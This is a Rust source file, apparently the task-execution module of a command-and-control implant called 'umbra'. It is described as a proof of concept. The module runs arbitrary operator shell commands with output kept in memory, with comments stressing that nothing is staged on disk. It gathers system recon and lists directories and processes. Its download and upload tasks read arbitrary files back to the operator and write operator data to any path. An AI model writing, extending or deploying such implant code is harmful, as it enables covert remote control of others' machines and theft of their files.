//! Task execution.
//!
//! All command execution is memory-only from the implant's point of view: the
//! command is handed to the platform shell through a pipe, its output is read
//! back into the process, and nothing is staged on disk (no temp scripts, no
//! dropped binaries). File transfer tasks only touch paths the operator names.

use std::io::Read;
use std::process::{Command, Stdio};
use std::sync::mpsc;
use std::thread;
use std::time::{Duration, Instant};

use crate::sysinfo;
use crate::upk::{self, Value};

pub const MAX_OUTPUT: usize = 900 * 1024; // stay below the 1 MiB frame limit

pub struct Outcome {
    pub code: i64,
    pub out: Vec<u8>,
    pub err: String,
}

impl Outcome {
    pub fn ok(out: Vec<u8>) -> Self {
        Outcome { code: 0, out, err: String::new() }
    }
    pub fn err(code: i64, msg: impl Into<String>) -> Self {
        Outcome { code, out: Vec::new(), err: msg.into() }
    }
    pub fn to_value(&self, task_id: &str) -> Value {
        upk::map(vec![
            ("id", upk::s(task_id)),
            ("code", upk::i(self.code)),
            ("out", upk::bin(&self.out)),
            ("err", upk::s(&self.err)),
        ])
    }
}

fn shell_command(cmd: &str) -> Command {
    #[cfg(windows)]
    {
        let mut c = Command::new("cmd.exe");
        c.arg("/C").arg(cmd);
        c
    }
    #[cfg(not(windows))]
    {
        let mut c = Command::new("/bin/sh");
        c.arg("-c").arg(cmd);
        c
    }
}

/// Read a pipe to EOF but keep at most `MAX_OUTPUT` (+ a small slack) bytes.
///
/// Reading to EOF is not optional: a child that writes more than the pipe
/// buffer (~64 KiB) blocks inside `write()` and would never exit, so "wait for
/// exit, then read" deadlocks on exactly the commands operators care about
/// (`ps aux`, `ls -R`, `dmesg`).
fn drain<R: Read>(mut pipe: R) -> Vec<u8> {
    let mut kept = Vec::new();
    let mut chunk = [0u8; 8192];
    loop {
        match pipe.read(&mut chunk) {
            Ok(0) => break,
            Ok(n) => {
                let room = (MAX_OUTPUT + 4096).saturating_sub(kept.len());
                if room > 0 {
                    kept.extend_from_slice(&chunk[..n.min(room)]);
                }
            }
            Err(ref e) if e.kind() == std::io::ErrorKind::Interrupted => continue,
            Err(_) => break,
        }
    }
    kept
}

fn truncate(mut v: Vec<u8>) -> Vec<u8> {
    if v.len() > MAX_OUTPUT {
        v.truncate(MAX_OUTPUT);
        v.extend_from_slice(b"\n[umbra: output truncated]\n");
    }
    v
}

/// Run a shell command with a hard timeout, capturing stdout+stderr.
///
/// Both pipes are drained by their own thread while the child runs; the main
/// thread only waits. Collecting the output afterwards is bounded, because a
/// background grandchild can keep a pipe open long after the child we spawned
/// has exited.
pub fn shell(cmd: &str, timeout_secs: u64) -> Outcome {
    if cmd.trim().is_empty() {
        return Outcome::err(1, "empty command");
    }
    let mut child = match shell_command(cmd)
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
    {
        Ok(c) => c,
        Err(e) => return Outcome::err(127, format!("spawn failed: {e}")),
    };

    let (tx, rx) = mpsc::channel::<(usize, Vec<u8>)>();
    if let Some(out) = child.stdout.take() {
        let tx = tx.clone();
        thread::spawn(move || {
            let _ = tx.send((0, drain(out)));
        });
    }
    if let Some(err) = child.stderr.take() {
        let tx = tx.clone();
        thread::spawn(move || {
            let _ = tx.send((1, drain(err)));
        });
    }
    drop(tx);

    let limit = timeout_secs.max(1);
    let deadline = Instant::now() + Duration::from_secs(limit);
    let timed_out = loop {
        match child.try_wait() {
            Ok(Some(_)) => break false,
            Ok(None) => {
                if Instant::now() > deadline {
                    let _ = child.kill();
                    let _ = child.wait();
                    break true;
                }
                thread::sleep(Duration::from_millis(20));
            }
            Err(e) => {
                let _ = child.kill();
                return Outcome::err(1, format!("wait failed: {e}"));
            }
        }
    };

    let collect_for = if timed_out { 200 } else { 2000 };
    let collect_until = Instant::now() + Duration::from_millis(collect_for);
    let mut parts: [Option<Vec<u8>>; 2] = [None, None];
    for _ in 0..2 {
        let left = collect_until.saturating_duration_since(Instant::now());
        if left.is_zero() {
            break;
        }
        match rx.recv_timeout(left) {
            Ok((which, buf)) => parts[which] = Some(buf),
            Err(_) => break,
        }
    }
    let mut out = parts[0].take().unwrap_or_default();
    if let Some(err) = parts[1].take() {
        out.extend_from_slice(&err);
    }

    if timed_out {
        // Partial output is still evidence: return what the command produced
        // before it was killed instead of throwing it away.
        return Outcome {
            code: 124,
            out: truncate(out),
            err: format!("command timed out after {limit}s"),
        };
    }

    let code = child.wait().ok().and_then(|s| s.code()).map(|c| c as i64).unwrap_or(0);
    Outcome { code, out: truncate(out), err: String::new() }
}

/// Execute one task. `sleep`/`exit` are handled by the beacon loop itself, so
/// they are only reported here for completeness.
pub fn run(kind: &str, args: &Value) -> Outcome {
    match kind {
        "shell" | "exec" => {
            let cmd = args.str_or("cmd", "");
            let timeout = args.u64_or("timeout", 120);
            shell(&cmd, timeout)
        }
        "sysinfo" | "recon" => Outcome::ok(sysinfo::report().into_bytes()),
        "pwd" | "cwd" => match std::env::current_dir() {
            Ok(p) => Outcome::ok(format!("{}\n", p.display()).into_bytes()),
            Err(e) => Outcome::err(1, format!("cwd: {e}")),
        },
        "ls" => {
            let path = args.str_or("path", ".");
            let mut out = String::new();
            match std::fs::read_dir(&path) {
                Ok(entries) => {
                    for entry in entries.flatten() {
                        let meta = entry.metadata().ok();
                        let kind = match meta {
                            Some(m) if m.is_dir() => "d",
                            _ => "-",
                        };
                        let size = meta.map(|m| m.len()).unwrap_or(0);
                        out.push_str(&format!(
                            "{kind} {:>12} {}\n",
                            size,
                            entry.path().display()
                        ));
                    }
                    Outcome::ok(out.into_bytes())
                }
                Err(e) => Outcome::err(1, format!("ls {path}: {e}")),
            }
        }
        "download" | "cat" => {
            let path = args.str_or("path", "");
            if path.is_empty() {
                return Outcome::err(1, "download requires args.path");
            }
            match std::fs::read(&path) {
                Ok(data) => Outcome::ok(truncate(data)),
                Err(e) => Outcome::err(1, format!("download {path}: {e}")),
            }
        }
        "upload" => {
            let path = args.str_or("path", "");
            let data = args.bin_or("data", b"");
            if path.is_empty() {
                return Outcome::err(1, "upload requires args.path");
            }
            match std::fs::write(&path, &data) {
                Ok(()) => Outcome::ok(format!("wrote {} bytes to {path}\n", data.len()).into_bytes()),
                Err(e) => Outcome::err(1, format!("upload {path}: {e}")),
            }
        }
        "ps" => {
            // Portable enough for a PoC: ask the platform for the process list.
            #[cfg(windows)]
            let cmd = "tasklist";
            #[cfg(target_os = "linux")]
            let cmd = "ps -eo pid,ppid,user,comm --sort=pid";
            #[cfg(target_os = "macos")]
            let cmd = "ps -eo pid,ppid,user,comm";
            #[cfg(not(any(windows, target_os = "linux", target_os = "macos")))]
            let cmd = "ps";
            shell(cmd, 30)
        }
        "sleep" => Outcome::ok(b"sleep interval updated\n".to_vec()),
        "exit" | "kill" => Outcome::ok(b"beacon exiting\n".to_vec()),
        "ping" => Outcome::ok(b"pong\n".to_vec()),
        other => Outcome::err(2, format!("unknown task kind {other:?}")),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn shell_captures_output() {
        let outcome = shell("echo umbra", 10);
        assert_eq!(outcome.code, 0);
        assert!(String::from_utf8_lossy(&outcome.out).contains("umbra"));
    }

    #[cfg(unix)]
    #[test]
    fn shell_does_not_deadlock_on_large_output() {
        // 512 KiB is eight pipe buffers: with "wait, then read" this hangs
        // until the timeout and comes back empty.
        let outcome = shell("head -c 524288 /dev/zero", 10);
        assert_eq!(outcome.code, 0);
        assert!(!outcome.out.is_empty(), "no output captured");
        assert!(outcome.err.is_empty());
    }

    #[test]
    fn drain_keeps_a_bounded_prefix() {
        let kept = drain(std::io::Cursor::new(vec![b'x'; MAX_OUTPUT + 10_000]));
        assert_eq!(kept.len(), MAX_OUTPUT + 4096);
        assert!(kept.iter().all(|b| *b == b'x'));
    }

    #[test]
    fn unknown_kind_is_reported() {
        let outcome = run("nope", &upk::map(vec![]));
        assert_eq!(outcome.code, 2);
        assert!(outcome.err.contains("unknown task kind"));
    }
}
